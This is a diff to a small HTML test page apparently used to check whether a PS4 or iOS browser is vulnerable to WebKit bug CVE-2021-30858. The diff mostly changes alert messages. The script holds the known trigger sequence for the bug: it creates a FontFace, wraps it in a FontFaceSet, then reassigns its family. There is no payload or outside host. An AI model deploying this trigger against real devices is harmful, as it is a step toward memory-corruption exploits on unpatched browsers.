@@ -19,16 +19,20 @@
         </style>
     <script>
 
+        async function url() {
+            alert("TEST ZELLIX 1");
+        }
+        
         async function testwebkit() {
             try{
-            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check bug API!!!");
+            alert("Testing CVE-2021-30858 on PS4 8.XX, Press OK ! (Work on IOS");
             let font = new FontFace('font1', 'url()',{});
-            alert("FontFace(). OK!!");
+            alert("FontFace(). Test 1 OK!");
             var fontFaceSet = new FontFaceSet([font]);
-            alert("FontFaceSet(). OK!!");
+            alert("FontFaceSet(). Test 2 OK!");
             
             font.family = 'font2';
-            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() are available on PS4 Browser :P!!");
+            alert("CVE-2021-30858 Webkit work!");
               }
             catch(e){
                 alert(e);
@@ -47,7 +51,6 @@
                 alert(e);
             }
 }
-
 
     </script>
 
